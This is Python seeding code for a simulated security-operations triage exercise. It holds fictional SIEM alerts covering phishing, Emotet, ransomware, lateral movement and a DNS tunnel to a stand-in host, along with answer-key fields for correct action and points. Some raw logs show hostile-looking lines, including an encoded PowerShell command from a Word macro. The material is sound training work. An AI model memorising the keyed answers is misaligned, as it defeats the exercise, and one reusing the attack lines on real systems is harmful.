        {"id":"ALERT-2026-0218-005","simulation_id":_sim,"timestamp":"2026-02-18T04:12:09Z","severity":"LOW","confidence":25,"source":"DNS Proxy","source_detail":"Cisco Umbrella","title":"Suspicious-looking DNS query (resolves to Microsoft CDN)","description":"Domain updates.microsoft-verify.com — phishing-like name but IP belongs to verified Microsoft CDN block.","details":"Query updates.microsoft-verify.com from 10.0.1.33 (WS-HR-03). Domain whitelisted Jan 2026.","src_ip":"10.0.1.33","src_host":"WS-HR-03","src_user":"a.gomez","dst_ip":"23.46.122.18","dst_geo":"USA (Microsoft CDN)","dst_reputation":"Verified Microsoft update infrastructure","affected_asset":"WS-HR-03","mitre_tactic":"Command and Control","mitre_technique":"T1071.004","mitre_name":"DNS","status":"open","triage_status":"unreviewed","sla_hours":8,"is_real_threat":False,"threat_type":"false_positive","correct_action":"resolve","points":5,"related_alerts":[],"playbook":"IR-FP-DNS: Whitelisted Domain","playbook_steps":["Verify domain in whitelist registry","Mark resolved"],"raw_log":"Feb 18 04:12:09 umbrella query=updates.microsoft-verify.com client=10.0.1.33 answer=23.46.122.18 reputation=clean cat=software-updates","analyst_notes":"","false_positive_indicators":"Domain verified as Microsoft update CDN — whitelisted since Jan 2026"},
        {"id":"ALERT-2026-0218-006","simulation_id":_sim,"timestamp":"2026-02-18T03:15:47Z","severity":"HIGH","confidence":68,"source":"IAM","source_detail":"Azure Active Directory","title":"Admin login from unusual geographic location","description":"sysadmin logged in from Lagos, Nigeria — outside normal pattern, but travel request TR-2026-0192 on file for Feb 15-22.","details":"sysadmin authenticated from 41.58.12.90 (Lagos, NG). Approved travel request covers this window.","src_ip":"41.58.12.90","src_host":"(external)","src_user":"sysadmin","dst_ip":"20.190.128.12","dst_geo":"Lagos, Nigeria","dst_reputation":"No prior IOC matches","affected_asset":"Azure AD tenant","mitre_tactic":"Initial Access","mitre_technique":"T1078.004","mitre_name":"Valid Accounts: Cloud Accounts","status":"open","triage_status":"unreviewed","sla_hours":2,"is_real_threat":False,"threat_type":"false_positive_travel","correct_action":"resolve","points":10,"related_alerts":[],"playbook":"IR-FP-TRAVEL: Approved Travel Login","playbook_steps":["Cross-check against HR travel calendar","Verify TR-2026-0192 covers Lagos Feb 15-22","Confirm MFA was used","Mark resolved if travel verified"],"raw_log":"Feb 18 03:15:47 AzureAD signin user=sysadmin ip=41.58.12.90 geo=\"Lagos,NG\" mfa=passed risk=medium ref=TR-2026-0192","analyst_notes":"","false_positive_indicators":"Travel request TR-2026-0192 (Feb 15-22, Lagos) on file in HR calendar — check before escalating"},
        {"id":"ALERT-2026-0218-007","simulation_id":_sim,"timestamp":"2026-02-18T05:30:15Z","severity":"LOW","confidence":10,"source":"AV","source_detail":"Windows Defender","title":"Potentially Unwanted Program detected","description":"BrowserHelper.exe — known adware family, not malicious.","details":"PUP found on WS-MARKETING-12. Standard cleanup — no escalation needed.","src_ip":"10.0.5.12","src_host":"WS-MARKETING-12","src_user":"r.dakin","dst_ip":"-","dst_geo":"-","dst_reputation":"-","affected_asset":"WS-MARKETING-12","mitre_tactic":"Execution","mitre_technique":"T1204.002","mitre_name":"User Execution: Malicious File","status":"open","triage_status":"unreviewed","sla_hours":8,"is_real_threat":False,"threat_type":"false_positive","correct_action":"resolve","points":5,"related_alerts":[],"playbook":"IR-FP-PUP: Adware Cleanup","playbook_steps":["Remove via Defender","No escalation"],"raw_log":"Feb 18 05:30:15 WS-MARKETING-12 Defender ThreatName=PUP/BrowserHelper Action=Quarantine Severity=Low","analyst_notes":"","false_positive_indicators":"PUP, not malware — standard cleanup, no escalation needed"},
        {"id":"ALERT-2026-0218-008","simulation_id":_sim,"timestamp":"2026-02-18T06:30:02Z","severity":"MEDIUM","confidence":80,"source":"Email Gateway","source_detail":"Proofpoint","title":"Mass phishing campaign — password reset lure","description":"150 employees received the lure; 12 clicked the link.","details":"Subject: \"Urgent: Password Reset Required\". Link: hxxps://microsoft-reset[.]evil[.]com. 12/150 clicked.","src_ip":"45.62.118.203","src_host":"(external sender)","src_user":"-","dst_ip":"-","dst_geo":"Hosting: Reston, VA","dst_reputation":"Domain registered 4 days ago — high risk","affected_asset":"Mail tenant + 12 clicker workstations","mitre_tactic":"Initial Access","mitre_technique":"T1566.002","mitre_name":"Phishing: Spearphishing Link","status":"open","triage_status":"unreviewed","sla_hours":4,"is_real_threat":True,"threat_type":"phishing","correct_action":"escalate","points":15,"related_alerts":["ALERT-2026-0218-012"],"playbook":"IR-PHISH-001: Mass Phishing Response","playbook_steps":["Pull message from all inboxes (delivery API)","Block sender domain at gateway","Force password reset for the 12 clickers","Push EDR scan to clicker endpoints","Notify users + manager email","Check for follow-on malware (correlate WS-FINANCE-07 etc.)"],"raw_log":"Feb 18 06:30:02 proofpoint sender=resets@microsoft-reset.evil.com recipients=150 subject=\"Urgent: Password Reset Required\" clicks=12 clickers=[j.smith,m.kade,r.osei,...]","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0218-009","simulation_id":_sim,"timestamp":"2026-02-18T12:15:44Z","severity":"LOW","confidence":5,"source":"Firewall","source_detail":"Palo Alto PA-5260","title":"High bandwidth usage during lunch hour","description":"Acceptable use violation — video streaming, not security threat.","details":"v.kumar streaming, 2.1 GB in 30 min during 12:00-12:30 lunch window.","src_ip":"10.0.5.44","src_host":"WS-OPS-08","src_user":"v.kumar","dst_ip":"185.45.110.23","dst_geo":"USA (Netflix CDN)","dst_reputation":"Streaming service — clean","affected_asset":"WS-OPS-08","mitre_tactic":"-","mitre_technique":"-","mitre_name":"-","status":"open","triage_status":"unreviewed","sla_hours":8,"is_real_threat":False,"threat_type":"false_positive","correct_action":"resolve","points":5,"related_alerts":[],"playbook":"IR-FP-AUP: Acceptable Use","playbook_steps":["Forward to HR/People Ops","No security action"],"raw_log":"Feb 18 12:15:44 PA-5260 user=v.kumar bytes=2147483648 dst_app=netflix category=streaming policy=AUP-warn","analyst_notes":"","false_positive_indicators":"Acceptable use violation, not security incident — forward to HR"},
        {"id":"ALERT-2026-0218-010","simulation_id":_sim,"timestamp":"2026-02-18T08:00:00Z","severity":"LOW","confidence":5,"source":"Network Monitor","source_detail":"PRTG","title":"ICMP health check (monitoring tool)","description":"Permanent whitelist — automated 5-minute health checks.","details":"PRTG → gateway, every 5 min. Permanent whitelist entry.","src_ip":"10.0.3.15","src_host":"PRTG-MON-01","src_user":"prtg","dst_ip":"10.0.3.1","dst_geo":"Internal","dst_reputation":"Internal","affected_asset":"Default gateway","mitre_tactic":"-","mitre_technique":"-","mitre_name":"-","status":"open","triage_status":"unreviewed","sla_hours":8,"is_real_threat":False,"threat_type":"false_positive","correct_action":"resolve","points":5,"related_alerts":[],"playbook":"IR-FP-MON: Monitoring Tool","playbook_steps":["Confirm source is PRTG-MON-01","Mark resolved"],"raw_log":"Feb 18 08:00:00 PRTG icmp src=10.0.3.15 dst=10.0.3.1 type=8 result=ok","analyst_notes":"","false_positive_indicators":"PRTG monitoring — permanent whitelist"},
        {"id":"ALERT-2026-0218-011","simulation_id":_sim,"timestamp":"2026-02-18T07:02:18Z","severity":"MEDIUM","confidence":55,"source":"EDR","source_detail":"CrowdStrike Falcon","title":"powershell.exe spawned by excel.exe","description":"Macro-style execution — could be legitimate Excel macro for finance reports OR document malware.","details":"WS-FINANCE-04: excel.exe → powershell.exe -ExecutionPolicy Bypass -File C:\\Reports\\refresh.ps1. User: f.adeyemi.","src_ip":"10.0.7.34","src_host":"WS-FINANCE-04","src_user":"f.adeyemi","dst_ip":"-","dst_geo":"-","dst_reputation":"-","affected_asset":"WS-FINANCE-04","mitre_tactic":"Execution","mitre_technique":"T1059.001","mitre_name":"Command and Scripting Interpreter: PowerShell","status":"open","triage_status":"unreviewed","sla_hours":4,"is_real_threat":None,"threat_type":"ambiguous","correct_action":"investigate","points":10,"related_alerts":[],"playbook":"IR-INV-MACRO: Macro Investigation","playbook_steps":["Inspect refresh.ps1 contents","Check whether f.adeyemi has approved macro use","Look for anomalous outbound from WS-FINANCE-04","Talk to f.adeyemi — confirm whether they ran the report"],"raw_log":"Feb 18 07:02:18 WS-FINANCE-04 falcon parent=excel.exe child=powershell.exe cmdline=\"powershell.exe -ExecutionPolicy Bypass -File C:\\Reports\\refresh.ps1\" user=f.adeyemi","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0218-012","simulation_id":_sim,"timestamp":"2026-02-18T07:15:51Z","severity":"MEDIUM","confidence":88,"source":"AV","source_detail":"Windows Defender","title":"Emotet-family executable detected","description":"Q3_Report.xlsx.exe matches known Emotet hash; victim is on the phishing clicker list.","details":"WS-FINANCE-07 (j.smith). SHA256 matches Emotet variant. j.smith is one of the 12 phishing clickers in ALERT-008.","src_ip":"10.0.7.07","src_host":"WS-FINANCE-07","src_user":"j.smith","dst_ip":"-","dst_geo":"-","dst_reputation":"-","affected_asset":"WS-FINANCE-07","mitre_tactic":"Execution","mitre_technique":"T1204.002","mitre_name":"User Execution: Malicious File","status":"open","triage_status":"unreviewed","sla_hours":2,"is_real_threat":True,"threat_type":"malware","correct_action":"escalate","points":15,"related_alerts":["ALERT-2026-0218-008"],"playbook":"IR-MAL-001: Malware Containment","playbook_steps":["Isolate WS-FINANCE-07","Capture memory image","Force password reset for j.smith","Hunt across estate for the same hash","Cross-correlate with the phishing campaign (ALERT-008)"],"raw_log":"Feb 18 07:15:51 WS-FINANCE-07 Defender ThreatName=Trojan:Win32/Emotet.PB!MTB Action=Quarantine SHA256=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0218-013","simulation_id":_sim,"timestamp":"2026-02-18T08:45:33Z","severity":"MEDIUM","confidence":20,"source":"Web Proxy","source_detail":"Zscaler","title":"TLS certificate mismatch on internal portal","description":"Cert expired 2 days ago — IT ticket INC-4521 already open.","details":"portal.company.com cert expired 2026-02-16. INC-4521 in progress.","src_ip":"-","src_host":"portal.company.com","src_user":"-","dst_ip":"10.0.10.50","dst_geo":"Internal","dst_reputation":"Internal","affected_asset":"portal.company.com","mitre_tactic":"-","mitre_technique":"-","mitre_name":"-","status":"open","triage_status":"unreviewed","sla_hours":4,"is_real_threat":False,"threat_type":"false_positive","correct_action":"resolve","points":5,"related_alerts":[],"playbook":"IR-FP-CERT: Known Cert Issue","playbook_steps":["Confirm INC-4521 is open","Mark resolved"],"raw_log":"Feb 18 08:45:33 zscaler tls_alert host=portal.company.com cert_status=expired expiry=2026-02-16 ticket=INC-4521","analyst_notes":"","false_positive_indicators":"Known cert expiry — IT working on renewal INC-4521"},
        {"id":"ALERT-2026-0218-014","simulation_id":_sim,"timestamp":"2026-02-18T09:01:12Z","severity":"LOW","confidence":8,"source":"Windows Security","source_detail":"DC01","log_source":"Windows Security (DC01)","title":"3 failed logons (Event 4625) followed by success (Event 4624) — likely typo","description":"Normal fat-finger pattern — 3× Event ID 4625 (failed logon, bad password) then Event ID 4624 (successful logon), same user, same workstation.","details":"m.johnson — 3× 4625 (Status 0xC000006A) then 4624 within 31 seconds. WS-SALES-03 → DC01.","src_ip":"10.0.2.44","src_host":"WS-SALES-03","src_user":"m.johnson","dst_ip":"10.0.0.10","dst_geo":"London, UK (internal)","dst_reputation":"Internal","affected_asset":"DC01 (domain controller)","mitre_tactic":"Credential Access","mitre_technique":"T1110.001","mitre_name":"Brute Force: Password Guessing","status":"open","triage_status":"unreviewed","sla_hours":8,"is_real_threat":False,"threat_type":"false_positive","correct_action":"resolve","points":5,"related_alerts":[],"playbook":"IR-FP-LOGIN: Typo Pattern","playbook_steps":["Review 4625/4624 sequence in the logon window","Confirm same source workstation for all attempts","Mark resolved"],"raw_log":"Feb 18 09:01:12 DC01 Microsoft-Windows-Security-Auditing EventID=4625 Status=0xC000006A TargetUser=m.johnson Workstation=WS-SALES-03 IpAddress=10.0.2.44 LogonType=3 (3 events 09:00:41-09:01:05) | EventID=4624 TargetUser=m.johnson Workstation=WS-SALES-03 IpAddress=10.0.2.44 LogonType=3","analyst_notes":"","false_positive_indicators":"User mistyped password — successful on 4th attempt, normal pattern"},
        {"id":"ALERT-2026-0218-015","simulation_id":_sim,"timestamp":"2026-02-18T08:30:44Z","severity":"MEDIUM","confidence":50,"source":"DAM","source_detail":"Imperva Database Activity Monitor","title":"Anomalous large customer SELECT","description":"SELECT * FROM customers WHERE region='ALL' returned 45,000 rows. Could be batch job — or harvesting.","details":"app-server-02 (svc_api) executed SELECT * FROM customers WHERE region='ALL' — 45,000 rows. No matching scheduled job logged.","src_ip":"10.0.6.20","src_host":"APP-SERVER-02","src_user":"svc_api","dst_ip":"10.0.4.22","dst_geo":"Internal","dst_reputation":"Internal","affected_asset":"PROD-DB-01 (customers table)","mitre_tactic":"Collection","mitre_technique":"T1213","mitre_name":"Data from Information Repositories","status":"open","triage_status":"unreviewed","sla_hours":4,"is_real_threat":None,"threat_type":"ambiguous","correct_action":"investigate","points":10,"related_alerts":[],"playbook":"IR-INV-DAM: Anomalous Query","playbook_steps":["Cross-check scheduled batch job calendar","Inspect svc_api recent process tree","Confirm with data team whether the export was sanctioned"],"raw_log":"Feb 18 08:30:44 imperva dam src=APP-SERVER-02 user=svc_api db=customers query=\"SELECT * FROM customers WHERE region='ALL'\" rows=45000 anomaly_score=0.72","analyst_notes":"","false_positive_indicators":None},
    ]])
    _seed_cybersecurity_siem_only()

def _seed_cybersecurity_siem_only():
    """Idempotent: clears prior day-1 SIEM alerts + system events for this sim,
    then re-inserts the standard day-1 batch and tags them day:1. Used by
    seed_cybersecurity() AND by the adaptive-engine top-up in /api/start so
    the SIEM tab always has content regardless of which seed path ran."""
    _sim = sim_id()
    if not siem_col.find_one({"simulation_id": _sim}, {"_id": 1}):
        # Alerts already live in siem_col from seed_cybersecurity above. Just stamp them.
        pass
    # System event for the day-1 SIEM outage scenario.
    if not system_events_col.find_one({"simulation_id": _sim, "tool": "siem"}):
        system_events_col.insert_one(
            {"id":"ev1","simulation_id":_sim,"type":"outage","tool":"siem","trigger_at":7,"end_at":10,"start_msg":"SIEM dashboard experiencing intermittent connectivity. Engineering is investigating.","end_msg":"SIEM connectivity restored.","points_for_report":5,"triggered":False,"resolved":False}
        )
    # Day-progression: tag every day-1 alert so /api/siem can filter by current_day.
    siem_col.update_many(
        {"simulation_id": _sim, "day": {"$exists": False}},
        {"$set": {"day": 1}},
    )

def _seed_cybersecurity_artifacts(cfg):
    """Adaptive-engine top-up: when the scenario engine produced the emails+tasks,
    the SIEM tab is still empty. Re-run the full cyber seed (delete first to avoid
    duplicate emails/tasks the engine already inserted is NOT done — we only want
    the SIEM data which the engine never touches)."""
    _sim = sim_id()
    if siem_col.find_one({"simulation_id": _sim}, {"_id": 1}):
        return  # Already populated — nothing to do.
    # Re-run the full seed; the engine already inserted its own emails/tasks/slack so
    # we'd duplicate those. To avoid that, call seed_cybersecurity then deduplicate.
    seed_cybersecurity(cfg)
    # Drop emails/tasks/slack that the seed re-inserted (dedupe by id keeping engine's).
    for col in (emails_col, tasks_col):
        seen = set()
        for d in col.find({"simulation_id": _sim}, {"_id": 1, "id": 1}).sort("_id", 1):
            if d["id"] in seen:
                col.delete_one({"_id": d["_id"]})
            else:
                seen.add(d["id"])

# ── CYBER DAY-PACKS (Days 2–5) ───────────────────────────────────
# Each entry seeds a day's worth of triage. Schema mirrors the day-1 alerts.
# Reveal happens via /api/advance_day, which inserts the day's batch and
# bumps sessions_col.current_day.
_CYBER_DAY_PACKS: dict[int, list[dict]] = {
    2: [
        {"id":"ALERT-2026-0219-001","timestamp":"2026-02-19T03:42:11Z","severity":"HIGH","confidence":85,"source":"EDR","source_detail":"CrowdStrike Falcon","title":"Suspicious PowerShell with encoded payload","description":"Encoded PowerShell command launched from Word macro on FIN-LAPTOP-12.","details":"Word spawned powershell.exe with -EncodedCommand flag; decoded payload calls Invoke-WebRequest to a fresh .top domain.","src_ip":"10.0.2.41","src_host":"FIN-LAPTOP-12","src_user":"j.miller","dst_ip":"193.142.60.18","dst_geo":"Sofia, Bulgaria","dst_reputation":"Newly registered (3 days)","affected_asset":"Finance laptop (Windows 11)","mitre_tactic":"Execution","mitre_technique":"T1059.001","mitre_name":"PowerShell","status":"open","triage_status":"unreviewed","sla_hours":2,"is_real_threat":True,"threat_type":"malware_dropper","correct_action":"escalate","points":15,"playbook":"IR-MAL-002: Macro-Initiated PowerShell","playbook_steps":["Isolate FIN-LAPTOP-12","Pull email gateway logs for delivered attachment","Check for lateral movement from j.miller","Update YARA rules with payload hash"],"raw_log":"Feb 19 03:42:11 FIN-LAPTOP-12 powershell[7411]: ParentProcess=WINWORD.EXE Cmd=\"powershell.exe -EncodedCommand JABwAD0AbgBlAHcA...\"","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0219-002","timestamp":"2026-02-19T05:11:02Z","severity":"MEDIUM","confidence":42,"source":"Firewall","source_detail":"Palo Alto","title":"Outbound traffic to known TOR exit node","description":"Single connection from a developer workstation to a TOR exit IP.","details":"One TCP connection from DEV-LAPTOP-08 to 185.220.101.7:443 — 3 KB transferred, then closed.","src_ip":"10.0.5.83","src_host":"DEV-LAPTOP-08","src_user":"a.patel","dst_ip":"185.220.101.7","dst_geo":"Frankfurt, Germany","dst_reputation":"Public TOR exit","affected_asset":"Developer laptop","mitre_tactic":"Command and Control","mitre_technique":"T1090.003","mitre_name":"Multi-hop Proxy: Tor","status":"open","triage_status":"unreviewed","sla_hours":4,"is_real_threat":False,"threat_type":"benign_dev_test","correct_action":"resolve","points":10,"playbook":"IR-NET-005: TOR Connection Triage","playbook_steps":["Check user role — security/research often have legitimate TOR use","Verify with user/manager","Tag asset and close if sanctioned"],"raw_log":"Feb 19 05:11:02 fw-edge proto=tcp src=10.0.5.83 dst=185.220.101.7 dst_port=443 bytes=3072 dur=2.1s","analyst_notes":"","false_positive_indicators":"a.patel is on the red-team — TOR usage is sanctioned per ticket SEC-411."},
        {"id":"ALERT-2026-0219-003","timestamp":"2026-02-19T07:24:19Z","severity":"CRITICAL","confidence":91,"source":"IAM","source_detail":"Okta","title":"Impossible-travel: London → São Paulo in 14 minutes","description":"Two successful logins from same account, geographically impossible.","details":"User n.kapoor logged in from London at 07:10:02Z and São Paulo at 07:24:19Z. No VPN configured for this account.","src_ip":"45.62.110.55","src_host":"(external — São Paulo, BR)","src_user":"n.kapoor","dst_ip":"-","dst_geo":"São Paulo, Brazil","dst_reputation":"Datacenter IP","affected_asset":"n.kapoor SSO account","mitre_tactic":"Initial Access","mitre_technique":"T1078","mitre_name":"Valid Accounts","status":"open","triage_status":"unreviewed","sla_hours":1,"is_real_threat":True,"threat_type":"account_takeover","correct_action":"escalate","points":20,"playbook":"IR-AUTH-001: Impossible Travel","playbook_steps":["Force password reset and revoke all sessions","Enable step-up MFA","Check for OAuth grants added in last 24h","Review user's mailbox rules for forwarding"],"raw_log":"Feb 19 07:24:19 okta auth user=n.kapoor src_ip=45.62.110.55 src_geo=BR result=success prev_login=07:10:02 src_geo=GB","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0219-004","timestamp":"2026-02-19T09:08:53Z","severity":"LOW","confidence":35,"source":"DLP","source_detail":"Microsoft Purview","title":"5 customer records emailed to gmail address","description":"Outbound email contained 5 customer records to a personal gmail address.","details":"User l.osei sent an email to lola.osei@gmail.com with a CSV containing 5 customer rows.","src_ip":"10.0.3.18","src_host":"-","src_user":"l.osei","dst_ip":"-","dst_geo":"-","dst_reputation":"Personal email","affected_asset":"Customer DB extract","mitre_tactic":"Exfiltration","mitre_technique":"T1567.002","mitre_name":"Exfiltration to Cloud Storage","status":"open","triage_status":"unreviewed","sla_hours":8,"is_real_threat":True,"threat_type":"insider_data_handling","correct_action":"investigate","points":12,"playbook":"IR-DLP-003: Personal-Email Exfil","playbook_steps":["Pull email and CSV content","Check if user had legitimate need","Inform manager — let HR/Legal decide on next steps","Add to user-behaviour baseline"],"raw_log":"Feb 19 09:08:53 purview rule=PII-EXTERNAL-EMAIL src=l.osei@shieldwall.io dst=lola.osei@gmail.com classified_records=5","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0219-005","timestamp":"2026-02-19T10:55:40Z","severity":"MEDIUM","confidence":48,"source":"SIEM","source_detail":"Splunk","title":"Brute-force attempts against /admin endpoint","description":"380 failed logins on /admin from a single IP in 6 minutes.","details":"380 POST /admin/login attempts from 91.214.45.66 — all failed (401). Web app has rate-limit but logs the attempts.","src_ip":"91.214.45.66","src_host":"(external — automated scanner)","src_user":"-","dst_ip":"10.0.1.5","dst_geo":"Internal","dst_reputation":"Edge web tier","affected_asset":"customer-portal.shieldwall.io","mitre_tactic":"Credential Access","mitre_technique":"T1110.003","mitre_name":"Brute Force: Password Spraying","status":"open","triage_status":"unreviewed","sla_hours":4,"is_real_threat":False,"threat_type":"automated_noise","correct_action":"resolve","points":8,"playbook":"IR-AUTH-004: Brute Force on Public Endpoint","playbook_steps":["Confirm WAF rate-limit kicked in","Block source IP at edge","Check if any attempt succeeded in window"],"raw_log":"Feb 19 10:55:40 nginx 91.214.45.66 - - \"POST /admin/login HTTP/1.1\" 401 0 \"-\" \"python-requests/2.31.0\" 380 attempts in 6m","analyst_notes":"","false_positive_indicators":"All attempts blocked at WAF — no successful auth, no DB hit. Standard internet noise."},
    ],
    3: [
        {"id":"ALERT-2026-0220-001","timestamp":"2026-02-20T01:13:08Z","severity":"CRITICAL","confidence":94,"source":"EDR","source_detail":"CrowdStrike Falcon","title":"Ransomware behaviour on file server","description":"Mass file rename and high-entropy writes detected on FILE-SRV-02.","details":"4,180 files renamed with .lockd extension over 8 minutes; original extensions include .docx/.xlsx/.pdf. Process tree: explorer.exe → unknown.exe (no signature).","src_ip":"10.0.4.31","src_host":"FILE-SRV-02","src_user":"svc_share","dst_ip":"10.0.4.31","dst_geo":"Internal","dst_reputation":"Internal","affected_asset":"File server (Finance share)","mitre_tactic":"Impact","mitre_technique":"T1486","mitre_name":"Data Encrypted for Impact","status":"open","triage_status":"unreviewed","sla_hours":1,"is_real_threat":True,"threat_type":"ransomware","correct_action":"escalate","points":25,"playbook":"IR-RW-001: Ransomware in Progress","playbook_steps":["KILL — stop the process and disconnect host from network","Snapshot any unencrypted files for evidence","Identify patient zero from process tree","Check backups: last successful restore point","Initiate P0 incident bridge — CISO + Legal + Comms"],"raw_log":"Feb 20 01:13:08 FILE-SRV-02 cs_falcon proc=unknown.exe pid=8124 parent=explorer.exe pid=212 hash=sha256:7f3a... files_modified=4180 entropy_avg=7.94","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0220-002","timestamp":"2026-02-20T02:30:14Z","severity":"HIGH","confidence":80,"source":"EDR","source_detail":"CrowdStrike Falcon","title":"Lateral movement: SMB from infected host","description":"FIN-LAPTOP-12 (yesterday's macro infection) initiating SMB to 14 internal hosts.","details":"FIN-LAPTOP-12 made 14 SMB (445/tcp) connections to internal hosts within 90s, including domain controllers.","src_ip":"10.0.2.41","src_host":"FIN-LAPTOP-12","src_user":"j.miller","dst_ip":"10.0.0.0/22","dst_geo":"Internal","dst_reputation":"Internal","affected_asset":"FIN-LAPTOP-12 + 14 destinations","mitre_tactic":"Lateral Movement","mitre_technique":"T1021.002","mitre_name":"SMB/Windows Admin Shares","status":"open","triage_status":"unreviewed","sla_hours":2,"is_real_threat":True,"threat_type":"lateral_movement","correct_action":"escalate","points":18,"related_alerts":["ALERT-2026-0219-001"],"playbook":"IR-LM-002: SMB Lateral Movement","playbook_steps":["Re-isolate FIN-LAPTOP-12 (was it ever properly contained?)","Pull SMB session logs from each destination","Check for new admin accounts created","Coordinate with AD team for domain-wide credential reset"],"raw_log":"Feb 20 02:30:14 cs_falcon src=FIN-LAPTOP-12 dst_count=14 dst_port=445 user=j.miller (SYSTEM) duration=90s","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0220-003","timestamp":"2026-02-20T08:12:41Z","severity":"MEDIUM","confidence":55,"source":"Email Gateway","source_detail":"Proofpoint","title":"Phishing wave — 142 employees, lookalike domain","description":"142 emails from sh1eldwall.io (note: '1' for 'i') with credential-harvest link.","details":"Subject 'Your VPN access expires in 24h — re-authenticate'. Link points to sh1eldwall-login.com (parked, looks identical to login portal).","src_ip":"-","src_host":"-","src_user":"phisher@sh1eldwall.io","dst_ip":"-","dst_geo":"-","dst_reputation":"Lookalike domain","affected_asset":"142 mailboxes","mitre_tactic":"Initial Access","mitre_technique":"T1566.002","mitre_name":"Spearphishing Link","status":"open","triage_status":"unreviewed","sla_hours":4,"is_real_threat":True,"threat_type":"credential_phish","correct_action":"escalate","points":15,"playbook":"IR-PHISH-001: Mass Phishing","playbook_steps":["Pull all 142 messages from inboxes (purge)","Block sender domain at gateway","Flag any users who clicked — force password reset","Add lookalike domain to DNS sinkhole","Send all-staff notice"],"raw_log":"Feb 20 08:12:41 proofpoint rule=lookalike-domain matched=142 messages from=phisher@sh1eldwall.io subject=\"VPN access expires in 24h\"","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0220-004","timestamp":"2026-02-20T09:45:07Z","severity":"LOW","confidence":30,"source":"VPN","source_detail":"Cisco AnyConnect","title":"VPN connection from new country (user travelling)","description":"User m.alvarez connected from Lisbon — first time from PT for this account.","details":"Single VPN session, valid MFA, no other anomalies. User has approved travel notice in HR system.","src_ip":"212.55.18.91","src_host":"(external — Lisbon, PT)","src_user":"m.alvarez","dst_ip":"-","dst_geo":"Lisbon, Portugal","dst_reputation":"Residential ISP","affected_asset":"VPN session","mitre_tactic":"Initial Access","mitre_technique":"T1078","mitre_name":"Valid Accounts","status":"open","triage_status":"unreviewed","sla_hours":8,"is_real_threat":False,"threat_type":"benign_travel","correct_action":"resolve","points":6,"playbook":"IR-VPN-002: New Country Login","playbook_steps":["Cross-check HR travel notice","Confirm with user via known channel","Close if sanctioned"],"raw_log":"Feb 20 09:45:07 anyconnect user=m.alvarez src_ip=212.55.18.91 src_geo=PT mfa=passed prev_country=GB","analyst_notes":"","false_positive_indicators":"HR ticket TRAVEL-91 approves Lisbon trip 19–24 Feb."},
        {"id":"ALERT-2026-0220-005","timestamp":"2026-02-20T11:38:22Z","severity":"HIGH","confidence":78,"source":"Web Proxy","source_detail":"Zscaler","title":"DNS tunnelling pattern detected","description":"Unusual high-volume TXT record queries from infected host.","details":"FIN-LAPTOP-12 made 1,840 DNS TXT queries to *.dnscat.example over 12 minutes — classic DNS-tunnel C2 pattern.","src_ip":"10.0.2.41","src_host":"FIN-LAPTOP-12","src_user":"j.miller","dst_ip":"-","dst_geo":"-","dst_reputation":"Suspicious DNS","affected_asset":"FIN-LAPTOP-12","mitre_tactic":"Command and Control","mitre_technique":"T1071.004","mitre_name":"DNS","status":"open","triage_status":"unreviewed","sla_hours":2,"is_real_threat":True,"threat_type":"c2_dns_tunnel","correct_action":"escalate","points":16,"related_alerts":["ALERT-2026-0219-001","ALERT-2026-0220-002"],"playbook":"IR-C2-002: DNS Tunnel","playbook_steps":["Sinkhole the parent domain at internal DNS","Pull pcap for the host","Confirm host is fully isolated","Update threat-intel feed with subdomains"],"raw_log":"Feb 20 11:38:22 zscaler dns_query host=FIN-LAPTOP-12 type=TXT subdomain=*.dnscat.example count=1840 duration=12m","analyst_notes":"","false_positive_indicators":None},
    ],
    4: [
        {"id":"ALERT-2026-0221-001","timestamp":"2026-02-21T04:02:55Z","severity":"HIGH","confidence":82,"source":"Cloud","source_detail":"AWS GuardDuty","title":"IAM access key used from new region","description":"Long-lived access key for prod-deploy used from us-west-1 — first time.","details":"Access key AKIA... (svc-prod-deploy) used from EC2 instance in us-west-1. Service is normally invoked from eu-west-2 only.","src_ip":"54.241.18.6","src_host":"(external — AWS us-west-1)","src_user":"svc-prod-deploy","dst_ip":"-","dst_geo":"us-west-1","dst_reputation":"AWS internal","affected_asset":"prod AWS account","mitre_tactic":"Defense Evasion","mitre_technique":"T1535","mitre_name":"Unused/Unsupported Cloud Regions","status":"open","triage_status":"unreviewed","sla_hours":2,"is_real_threat":True,"threat_type":"key_compromise","correct_action":"escalate","points":18,"playbook":"IR-CLOUD-001: IAM Key Misuse","playbook_steps":["Disable the access key immediately","Rotate the key and update CI/CD","Pull CloudTrail for past 7 days for this key","Identify how the key leaked (Git history? Slack DM? Laptop?)"],"raw_log":"Feb 21 04:02:55 guardduty finding_type=Recon:IAMUser/UnusualRegion principal=svc-prod-deploy src_ip=54.241.18.6 region=us-west-1 normal_region=eu-west-2","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0221-002","timestamp":"2026-02-21T07:18:33Z","severity":"MEDIUM","confidence":50,"source":"EDR","source_detail":"CrowdStrike Falcon","title":"PsExec used from non-admin host","description":"PsExec invoked from MKT-LAPTOP-04 against MKT-LAPTOP-09.","details":"Sales user moved a file using PsExec — unusual for a non-IT host.","src_ip":"10.0.7.14","src_host":"MKT-LAPTOP-04","src_user":"r.green","dst_ip":"10.0.7.21","dst_geo":"Internal","dst_reputation":"Internal","affected_asset":"Marketing laptops","mitre_tactic":"Execution","mitre_technique":"T1569.002","mitre_name":"Service Execution","status":"open","triage_status":"unreviewed","sla_hours":4,"is_real_threat":False,"threat_type":"benign_admin_tooling","correct_action":"investigate","points":10,"playbook":"IR-EXEC-005: PsExec Triage","playbook_steps":["Confirm with user what they were doing","Check whether the destination accepted the file","Tag pattern in user behaviour","Educate user on approved alternatives"],"raw_log":"Feb 21 07:18:33 cs_falcon src=MKT-LAPTOP-04 user=r.green proc=PsExec.exe args=\"\\\\MKT-LAPTOP-09 -c report.docx\"","analyst_notes":"","false_positive_indicators":"User confirmed sharing a presentation. PsExec was downloaded from official Sysinternals site, scanned clean."},
